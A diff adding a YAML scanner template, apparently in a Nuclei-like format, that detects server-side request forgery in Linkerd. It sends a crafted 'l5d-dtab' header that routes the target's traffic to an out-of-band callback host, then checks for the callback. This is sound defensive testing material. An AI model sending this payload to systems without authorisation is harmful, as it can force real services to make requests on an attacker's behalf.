@@ -1,0 +1,23 @@
+id: linkerd-ssrf-detection
+brief:
+    title: Linkerd SSRF detection
+    by: dudez
+    level: high
+    about: Linkerd is vulnerable to SSRF.
+    label:
+        - ssrf
+        - linkerd
+        - oast
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}'
+      head:
+        l5d-dtab: /svc/* => /$/inet/{{interactsh-url}}/443
+      signs:
+        - "on": word
+          has:
+            - http
+          in: interactsh_protocol
